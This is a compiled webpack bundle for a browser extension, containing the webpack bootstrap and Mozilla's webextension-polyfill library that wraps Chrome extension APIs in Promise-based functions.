/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, { enumerable: true, get: getter });
/******/ 		}
/******/ 	};
/******/
/******/ 	// define __esModule on exports
/******/ 	__webpack_require__.r = function(exports) {
/******/ 		if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 			Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 		}
/******/ 		Object.defineProperty(exports, '__esModule', { value: true });
/******/ 	};
/******/
/******/ 	// create a fake namespace object
/******/ 	// mode & 1: value is a module id, require it
/******/ 	// mode & 2: merge all properties of value into the ns
/******/ 	// mode & 4: return value when already ns object
/******/ 	// mode & 8|1: behave like require
/******/ 	__webpack_require__.t = function(value, mode) {
/******/ 		if(mode & 1) value = __webpack_require__(value);
/******/ 		if(mode & 8) return value;
/******/ 		if((mode & 4) && typeof value === 'object' && value && value.__esModule) return value;
/******/ 		var ns = Object.create(null);
/******/ 		__webpack_require__.r(ns);
/******/ 		Object.defineProperty(ns, 'default', { enumerable: true, value: value });
/******/ 		if(mode & 2 && typeof value != 'string') for(var key in value) __webpack_require__.d(ns, key, function(key) { return value[key]; }.bind(null, key));
/******/ 		return ns;
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = "./assets/ts/additional.ts");
/******/ })
/************************************************************************/
/******/ ({

/***/ "../node_modules/webextension-polyfill-ts/lib/index.js":
/*!*************************************************************!*\
  !*** ../node_modules/webextension-polyfill-ts/lib/index.js ***!
  \*************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

"use strict";

Object.defineProperty(exports, "__esModule", { value: true });

// if not in a browser, assume we're in a test, return a dummy
if (typeof window === "undefined") exports.browser = {};
else exports.browser = __webpack_require__(/*! webextension-polyfill */ "../node_modules/webextension-polyfill/dist/browser-polyfill.js");


/***/ }),

/***/ "../node_modules/webextension-polyfill/dist/browser-polyfill.js":
/*!**********************************************************************!*\
  !*** ../node_modules/webextension-polyfill/dist/browser-polyfill.js ***!
  \**********************************************************************/
/*! no static exports found */
/***/ (function(module, exports, __webpack_require__) {

var __WEBPACK_AMD_DEFINE_FACTORY__, __WEBPACK_AMD_DEFINE_ARRAY__, __WEBPACK_AMD_DEFINE_RESULT__;(function (global, factory) {
  if (true) {
    !(__WEBPACK_AMD_DEFINE_ARRAY__ = [module], __WEBPACK_AMD_DEFINE_FACTORY__ = (factory),
				__WEBPACK_AMD_DEFINE_RESULT__ = (typeof __WEBPACK_AMD_DEFINE_FACTORY__ === 'function' ?
				(__WEBPACK_AMD_DEFINE_FACTORY__.apply(exports, __WEBPACK_AMD_DEFINE_ARRAY__)) : __WEBPACK_AMD_DEFINE_FACTORY__),
				__WEBPACK_AMD_DEFINE_RESULT__ !== undefined && (module.exports = __WEBPACK_AMD_DEFINE_RESULT__));
  } else { var mod; }
})(typeof globalThis !== "undefined" ? globalThis : typeof self !== "undefined" ? self : this, function (module) {
  /* webextension-polyfill - v0.6.0 - Mon Dec 23 2019 12:32:53 */

  /* -*- Mode: indent-tabs-mode: nil; js-indent-level: 2 -*- */

  /* vim: set sts=2 sw=2 et tw=80: */

  /* This Source Code Form is subject to the terms of the Mozilla Public
   * License, v. 2.0. If a copy of the MPL was not distributed with this
   * file, You can obtain one at http://mozilla.org/MPL/2.0/. */
  "use strict";

  if (typeof browser === "undefined" || Object.getPrototypeOf(browser) !== Object.prototype) {
    const CHROME_SEND_MESSAGE_CALLBACK_NO_RESPONSE_MESSAGE = "The message port closed before a response was received.";
    const SEND_RESPONSE_DEPRECATION_WARNING = "Returning a Promise is the preferred way to send a reply from an onMessage/onMessageExternal listener, as the sendResponse will be removed from the specs (See https://developer.mozilla.org/docs/Mozilla/Add-ons/WebExtensions/API/runtime/onMessage)"; // Wrapping the bulk of this polyfill in a one-time-use function is a minor
    // optimization for Firefox. Since Spidermonkey does not fully parse the
    // contents of a function until the first time it's called, and since it will
    // never actually need to be called, this allows the polyfill to be included
    // in Firefox nearly for free.

    const wrapAPIs = extensionAPIs => {
      // NOTE: apiMetadata is associated to the content of the api-metadata.json file
      // at build time by replacing the following "include" with the content of the
      // JSON file.
      const apiMetadata = {
        "alarms": {
          "clear": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "clearAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "get": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "bookmarks": {
          "create": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getChildren": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getRecent": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getSubTree": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getTree": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "move": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeTree": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "search": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        },
        "browserAction": {
          "disable": {
            "minArgs": 0,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "enable": {
            "minArgs": 0,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "getBadgeBackgroundColor": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getBadgeText": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getPopup": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getTitle": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "openPopup": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "setBadgeBackgroundColor": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setBadgeText": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setIcon": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "setPopup": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setTitle": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          }
        },
        "browsingData": {
          "remove": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "removeCache": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeCookies": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeDownloads": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeFormData": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeHistory": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeLocalStorage": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removePasswords": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removePluginData": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "settings": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "commands": {
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "contextMenus": {
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        },
        "cookies": {
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAllCookieStores": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "set": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "devtools": {
          "inspectedWindow": {
            "eval": {
              "minArgs": 1,
              "maxArgs": 2,
              "singleCallbackArg": false
            }
          },
          "panels": {
            "create": {
              "minArgs": 3,
              "maxArgs": 3,
              "singleCallbackArg": true
            }
          }
        },
        "downloads": {
          "cancel": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "download": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "erase": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getFileIcon": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "open": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "pause": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeFile": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "resume": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "search": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "show": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          }
        },
        "extension": {
          "isAllowedFileSchemeAccess": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "isAllowedIncognitoAccess": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "history": {
          "addUrl": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "deleteAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "deleteRange": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "deleteUrl": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getVisits": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "search": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "i18n": {
          "detectLanguage": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAcceptLanguages": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "identity": {
          "launchWebAuthFlow": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "idle": {
          "queryState": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "management": {
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getSelf": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "setEnabled": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "uninstallSelf": {
            "minArgs": 0,
            "maxArgs": 1
          }
        },
        "notifications": {
          "clear": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "create": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getPermissionLevel": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        },
        "pageAction": {
          "getPopup": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getTitle": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "hide": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setIcon": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "setPopup": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "setTitle": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          },
          "show": {
            "minArgs": 1,
            "maxArgs": 1,
            "fallbackToNoCallback": true
          }
        },
        "permissions": {
          "contains": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "request": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "runtime": {
          "getBackgroundPage": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getPlatformInfo": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "openOptionsPage": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "requestUpdateCheck": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "sendMessage": {
            "minArgs": 1,
            "maxArgs": 3
          },
          "sendNativeMessage": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "setUninstallURL": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "sessions": {
          "getDevices": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getRecentlyClosed": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "restore": {
            "minArgs": 0,
            "maxArgs": 1
          }
        },
        "storage": {
          "local": {
            "clear": {
              "minArgs": 0,
              "maxArgs": 0
            },
            "get": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "getBytesInUse": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "remove": {
              "minArgs": 1,
              "maxArgs": 1
            },
            "set": {
              "minArgs": 1,
              "maxArgs": 1
            }
          },
          "managed": {
            "get": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "getBytesInUse": {
              "minArgs": 0,
              "maxArgs": 1
            }
          },
          "sync": {
            "clear": {
              "minArgs": 0,
              "maxArgs": 0
            },
            "get": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "getBytesInUse": {
              "minArgs": 0,
              "maxArgs": 1
            },
            "remove": {
              "minArgs": 1,
              "maxArgs": 1
            },
            "set": {
              "minArgs": 1,
              "maxArgs": 1
            }
          }
        },
        "tabs": {
          "captureVisibleTab": {
            "minArgs": 0,
            "maxArgs": 2
          },
          "create": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "detectLanguage": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "discard": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "duplicate": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "executeScript": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "get": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getCurrent": {
            "minArgs": 0,
            "maxArgs": 0
          },
          "getZoom": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getZoomSettings": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "highlight": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "insertCSS": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "move": {
            "minArgs": 2,
            "maxArgs": 2
          },
          "query": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "reload": {
            "minArgs": 0,
            "maxArgs": 2
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "removeCSS": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "sendMessage": {
            "minArgs": 2,
            "maxArgs": 3
          },
          "setZoom": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "setZoomSettings": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "update": {
            "minArgs": 1,
            "maxArgs": 2
          }
        },
        "topSites": {
          "get": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "webNavigation": {
          "getAllFrames": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "getFrame": {
            "minArgs": 1,
            "maxArgs": 1
          }
        },
        "webRequest": {
          "handlerBehaviorChanged": {
            "minArgs": 0,
            "maxArgs": 0
          }
        },
        "windows": {
          "create": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "get": {
            "minArgs": 1,
            "maxArgs": 2
          },
          "getAll": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getCurrent": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "getLastFocused": {
            "minArgs": 0,
            "maxArgs": 1
          },
          "remove": {
            "minArgs": 1,
            "maxArgs": 1
          },
          "update": {
            "minArgs": 2,
            "maxArgs": 2
          }
        }
      };

      if (Object.keys(apiMetadata).length === 0) {
        throw new Error("api-metadata.json has not been included in browser-polyfill");
      }
      /**
       * A WeakMap subclass which creates and stores a value for any key which does
       * not exist when accessed, but behaves exactly as an ordinary WeakMap
       * otherwise.
       *
       * @param {function} createItem
       *        A function which will be called in order to create the value for any
       *        key which does not exist, the first time it is accessed. The
       *        function receives, as its only argument, the key being created.
       */


      class DefaultWeakMap extends WeakMap {
        constructor(createItem, items = undefined) {
          super(items);
          this.createItem = createItem;
        }

        get(key) {
          if (!this.has(key)) {
            this.set(key, this.createItem(key));
          }

          return super.get(key);
        }

      }
      /**
       * Returns true if the given object is an object with a `then` method, and can
       * therefore be assumed to behave as a Promise.
       *
       * @param {*} value The value to test.
       * @returns {boolean} True if the value is thenable.
       */


      const isThenable = value => {
        return value && typeof value === "object" && typeof value.then === "function";
      };
      /**
       * Creates and returns a function which, when called, will resolve or reject
       * the given promise based on how it is called:
       *
       * - If, when called, `chrome.runtime.lastError` contains a non-null object,
       *   the promise is rejected with that value.
       * - If the function is called with exactly one argument, the promise is
       *   resolved to that value.
       * - Otherwise, the promise is resolved to an array containing all of the
       *   function's arguments.
       *
       * @param {object} promise
       *        An object containing the resolution and rejection functions of a
       *        promise.
       * @param {function} promise.resolve
       *        The promise's resolution function.
       * @param {function} promise.rejection
       *        The promise's rejection function.
       * @param {object} metadata
       *        Metadata about the wrapped method which has created the callback.
       * @param {integer} metadata.maxResolvedArgs
       *        The maximum number of arguments which may be passed to the
       *        callback created by the wrapped async function.
       *
       * @returns {function}
       *        The generated callback function.
       */


      const makeCallback = (promise, metadata) => {
        return (...callbackArgs) => {
          if (extensionAPIs.runtime.lastError) {
            promise.reject(extensionAPIs.runtime.lastError);
          } else if (metadata.singleCallbackArg || callbackArgs.length <= 1 && metadata.singleCallbackArg !== false) {
            promise.resolve(callbackArgs[0]);
          } else {
            promise.resolve(callbackArgs);
          }
        };
      };

      const pluralizeArguments = numArgs => numArgs == 1 ? "argument" : "arguments";
      /**
       * Creates a wrapper function for a method with the given name and metadata.
       *
       * @param {string} name
       *        The name of the method which is being wrapped.
       * @param {object} metadata
       *        Metadata about the method being wrapped.
       * @param {integer} metadata.minArgs
       *        The minimum number of arguments which must be passed to the
       *        function. If called with fewer than this number of arguments, the
       *        wrapper will raise an exception.
       * @param {integer} metadata.maxArgs
       *        The maximum number of arguments which may be passed to the
       *        function. If called with more than this number of arguments, the
       *        wrapper will raise an exception.
       * @param {integer} metadata.maxResolvedArgs
       *        The maximum number of arguments which may be passed to the
       *        callback created by the wrapped async function.
       *
       * @returns {function(object, ...*)}
       *       The generated wrapper function.
       */


      const wrapAsyncFunction = (name, metadata) => {
        return function asyncFunctionWrapper(target, ...args) {
          if (args.length < metadata.minArgs) {
            throw new Error(`Expected at least ${metadata.minArgs} ${pluralizeArguments(metadata.minArgs)} for ${name}(), got ${args.length}`);
          }

          if (args.length > metadata.maxArgs) {
            throw new Error(`Expected at most ${metadata.maxArgs} ${pluralizeArguments(metadata.maxArgs)} for ${name}(), got ${args.length}`);
          }

          return new Promise((resolve, reject) => {
            if (metadata.fallbackToNoCallback) {
              // This API method has currently no callback on Chrome, but it return a promise on Firefox,
              // and so the polyfill will try to call it with a callback first, and it will fallback
              // to not passing the callback if the first call fails.
              try {
                target[name](...args, makeCallback({
                  resolve,
                  reject
                }, metadata));
              } catch (cbError) {
                console.warn(`${name} API method doesn't seem to support the callback parameter, ` + "falling back to call it without a callback: ", cbError);
                target[name](...args); // Update the API method metadata, so that the next API calls will not try to
                // use the unsupported callback anymore.

                metadata.fallbackToNoCallback = false;
                metadata.noCallback = true;
                resolve();
              }
            } else if (metadata.noCallback) {
              target[name](...args);
              resolve();
            } else {
              target[name](...args, makeCallback({
                resolve,
                reject
              }, metadata));
            }
          });
        };
      };
      /**
       * Wraps an existing method of the target object, so that calls to it are
       * intercepted by the given wrapper function. The wrapper function receives,
       * as its first argument, the original `target` object, followed by each of
       * the arguments passed to the original method.
       *
       * @param {object} target
       *        The original target object that the wrapped method belongs to.
       * @param {function} method
       *        The method being wrapped. This is used as the target of the Proxy
       *        object which is created to wrap the method.
       * @param {function} wrapper
       *        The wrapper function which is called in place of a direct invocation
       *        of the wrapped method.
       *
       * @returns {Proxy<function>}
       *        A Proxy object for the given method, which invokes the given wrapper
       *        method in its place.
       */


      const wrapMethod = (target, method, wrapper) => {
        return new Proxy(method, {
          apply(targetMethod, thisObj, args) {
            return wrapper.call(thisObj, target, ...args);
          }

        });
      };

      let hasOwnProperty = Function.call.bind(Object.prototype.hasOwnProperty);
      /**
       * Wraps an object in a Proxy which intercepts and wraps certain methods
       * based on the given `wrappers` and `metadata` objects.
       *
       * @param {object} target
       *        The target object to wrap.
       *
       * @param {object} [wrappers = {}]
       *        An object tree containing wrapper functions for special cases. Any
       *        function present in this object tree is called in place of the
       *        method in the same location in the `target` object tree. These
       *        wrapper methods are invoked as described in {@see wrapMethod}.
       *
       * @param {object} [metadata = {}]
       *        An object tree containing metadata used to automatically generate
       *        Promise-based wrapper functions for asynchronous. Any function in
       *        the `target` object tree which has a corresponding metadata object
       *        in the same location in the `metadata` tree is replaced with an
       *        automatically-generated wrapper function, as described in
       *        {@see wrapAsyncFunction}
       *
       * @returns {Proxy<object>}
       */

      const wrapObject = (target, wrappers = {}, metadata = {}) => {
        let cache = Object.create(null);
        let handlers = {
          has(proxyTarget, prop) {
            return prop in target || prop in cache;
          },

          get(proxyTarget, prop, receiver) {
            if (prop in cache) {
              return cache[prop];
            }

            if (!(prop in target)) {
              return undefined;
            }

            let value = target[prop];

            if (typeof value === "function") {
              // This is a method on the underlying object. Check if we need to do
              // any wrapping.
              if (typeof wrappers[prop] === "function") {
                // We have a special-case wrapper for this method.
                value = wrapMethod(target, target[prop], wrappers[prop]);
              } else if (hasOwnProperty(metadata, prop)) {
                // This is an async method that we have metadata for. Create a
                // Promise wrapper for it.
                let wrapper = wrapAsyncFunction(prop, metadata[prop]);
                value = wrapMethod(target, target[prop], wrapper);
              } else {
                // This is a method that we don't know or care about. Return the
                // original method, bound to the underlying object.
                value = value.bind(target);
              }
            } else if (typeof value === "object" && value !== null && (hasOwnProperty(wrappers, prop) || hasOwnProperty(metadata, prop))) {
              // This is an object that we need to do some wrapping for the children
              // of. Create a sub-object wrapper for it with the appropriate child
              // metadata.
              value = wrapObject(value, wrappers[prop], metadata[prop]);
            } else if (hasOwnProperty(metadata, "*")) {
              // Wrap all properties in * namespace.
              value = wrapObject(value, wrappers[prop], metadata["*"]);
            } else {
              // We don't need to do any wrapping for this property,
              // so just forward all access to the underlying object.
              Object.defineProperty(cache, prop, {
                configurable: true,
                enumerable: true,

                get() {
                  return target[prop];
                },

                set(value) {
                  target[prop] = value;
                }

              });
              return value;
            }

            cache[prop] = value;
            return value;
          },

          set(proxyTarget, prop, value, receiver) {
            if (prop in cache) {
              cache[prop] = value;
            } else {
              target[prop] = value;
            }

            return true;
          },

          defineProperty(proxyTarget, prop, desc) {
            return Reflect.defineProperty(cache, prop, desc);
          },

          deleteProperty(proxyTarget, prop) {
            return Reflect.deleteProperty(cache, prop);
          }

        }; // Per contract of the Proxy API, the "get" proxy handler must return the
        // original value of the target if that value is declared read-only and
        // non-configurable. For this reason, we create an object with the
        // prototype set to `target` instead of using `target` directly.
        // Otherwise we cannot return a custom object for APIs that
        // are declared read-only and non-configurable, such as `chrome.devtools`.
        //
        // The proxy handlers themselves will still use the original `target`
        // instead of the `proxyTarget`, so that the methods and properties are
        // dereferenced via the original targets.

        let proxyTarget = Object.create(target);
        return new Proxy(proxyTarget, handlers);
      };
      /**
       * Creates a set of wrapper functions for an event object, which handles
       * wrapping of listener functions that those messages are passed.
       *
       * A single wrapper is created for each listener function, and stored in a
       * map. Subsequent calls to `addListener`, `hasListener`, or `removeListener`
       * retrieve the original wrapper, so that  attempts to remove a
       * previously-added listener work as expected.
       *
       * @param {DefaultWeakMap<function, function>} wrapperMap
       *        A DefaultWeakMap object which will create the appropriate wrapper
       *        for a given listener function when one does not exist, and retrieve
       *        an existing one when it does.
       *
       * @returns {object}
       */


      const wrapEvent = wrapperMap => ({
        addListener(target, listener, ...args) {
          target.addListener(wrapperMap.get(listener), ...args);
        },

        hasListener(target, listener) {
          return target.hasListener(wrapperMap.get(listener));
        },

        removeListener(target, listener) {
          target.removeListener(wrapperMap.get(listener));
        }

      }); // Keep track if the deprecation warning has been logged at least once.


      let loggedSendResponseDeprecationWarning = false;
      const onMessageWrappers = new DefaultWeakMap(listener => {
        if (typeof listener !== "function") {
          return listener;
        }
        /**
         * Wraps a message listener function so that it may send responses based on
         * its return value, rather than by returning a sentinel value and calling a
         * callback. If the listener function returns a Promise, the response is
         * sent when the promise either resolves or rejects.
         *
         * @param {*} message
         *        The message sent by the other end of the channel.
         * @param {object} sender
         *        Details about the sender of the message.
         * @param {function(*)} sendResponse
         *        A callback which, when called with an arbitrary argument, sends
         *        that value as a response.
         * @returns {boolean}
         *        True if the wrapped listener returned a Promise, which will later
         *        yield a response. False otherwise.
         */


        return function onMessage(message, sender, sendResponse) {
          let didCallSendResponse = false;
          let wrappedSendResponse;
          let sendResponsePromise = new Promise(resolve => {
            wrappedSendResponse = function (response) {
              if (!loggedSendResponseDeprecationWarning) {
                console.warn(SEND_RESPONSE_DEPRECATION_WARNING, new Error().stack);
                loggedSendResponseDeprecationWarning = true;
              }

              didCallSendResponse = true;
              resolve(response);
            };
          });
          let result;

          try {
            result = listener(message, sender, wrappedSendResponse);
          } catch (err) {
            result = Promise.reject(err);
          }

          const isResultThenable = result !== true && isThenable(result); // If the listener didn't returned true or a Promise, or called
          // wrappedSendResponse synchronously, we can exit earlier
          // because there will be no response sent from this listener.

          if (result !== true && !isResultThenable && !didCallSendResponse) {
            return false;
          } // A small helper to send the message if the promise resolves
          // and an error if the promise rejects (a wrapped sendMessage has
          // to translate the message into a resolved promise or a rejected
          // promise).


          const sendPromisedResult = promise => {
            promise.then(msg => {
              // send the message value.
              sendResponse(msg);
            }, error => {
              // Send a JSON representation of the error if the rejected value
              // is an instance of error, or the object itself otherwise.
              let message;

              if (error && (error instanceof Error || typeof error.message === "string")) {
                message = error.message;
              } else {
                message = "An unexpected error occurred";
              }

              sendResponse({
                __mozWebExtensionPolyfillReject__: true,
                message
              });
            }).catch(err => {
              // Print an error on the console if unable to send the response.
              console.error("Failed to send onMessage rejected reply", err);
            });
          }; // If the listener returned a Promise, send the resolved value as a
          // result, otherwise wait the promise related to the wrappedSendResponse
          // callback to resolve and send it as a response.


          if (isResultThenable) {
            sendPromisedResult(result);
          } else {
            sendPromisedResult(sendResponsePromise);
          } // Let Chrome know that the listener is replying.


          return true;
        };
      });

      const wrappedSendMessageCallback = ({
        reject,
        resolve
      }, reply) => {
        if (extensionAPIs.runtime.lastError) {
          // Detect when none of the listeners replied to the sendMessage call and resolve
          // the promise to undefined as in Firefox.
          // See https://github.com/mozilla/webextension-polyfill/issues/130
          if (extensionAPIs.runtime.lastError.message === CHROME_SEND_MESSAGE_CALLBACK_NO_RESPONSE_MESSAGE) {
            resolve();
          } else {
            reject(extensionAPIs.runtime.lastError);
          }
        } else if (reply && reply.__mozWebExtensionPolyfillReject__) {
          // Convert back the JSON representation of the error into
          // an Error instance.
          reject(new Error(reply.message));
        } else {
          resolve(reply);
        }
      };

      const wrappedSendMessage = (name, metadata, apiNamespaceObj, ...args) => {
        if (args.length < metadata.minArgs) {
          throw new Error(`Expected at least ${metadata.minArgs} ${pluralizeArguments(metadata.minArgs)} for ${name}(), got ${args.length}`);
        }

        if (args.length > metadata.maxArgs) {
          throw new Error(`Expected at most ${metadata.maxArgs} ${pluralizeArguments(metadata.maxArgs)} for ${name}(), got ${args.length}`);
        }

        return new Promise((resolve, reject) => {
          const wrappedCb = wrappedSendMessageCallback.bind(null, {
            resolve,
            reject
          });
          args.push(wrappedCb);
          apiNamespaceObj.sendMessage(...args);
        });
      };

      const staticWrappers = {
        runtime: {
          onMessage: wrapEvent(onMessageWrappers),
          onMessageExternal: wrapEvent(onMessageWrappers),
          sendMessage: wrappedSendMessage.bind(null, "sendMessage", {
            minArgs: 1,
            maxArgs: 3
          })
        },
        tabs: {
          sendMessage: wrappedSendMessage.bind(null, "sendMessage", {
            minArgs: 2,
            maxArgs: 3
          })
        }
      };
      const settingMetadata = {
        clear: {
          minArgs: 1,
          maxArgs: 1
        },
        get: {
          minArgs: 1,
          maxArgs: 1
        },
        set: {
          minArgs: 1,
          maxArgs: 1
        }
      };
      apiMetadata.privacy = {
        network: {
          "*": settingMetadata
        },
        services: {
          "*": settingMetadata
        },
        websites: {
          "*": settingMetadata
        }
      };
      return wrapObject(extensionAPIs, staticWrappers, apiMetadata);
    };

    if (typeof chrome != "object" || !chrome || !chrome.runtime || !chrome.runtime.id) {
      throw new Error("This script should only be loaded in a browser extension.");
    } // The build process adds a UMD wrapper around this file, which makes the
    // `module` variable available.


    module.exports = wrapAPIs(chrome);
  } else {
    module.exports = browser;
  }
});
//# sourceMappingURL=browser-polyfill.js.map


/***/ }),

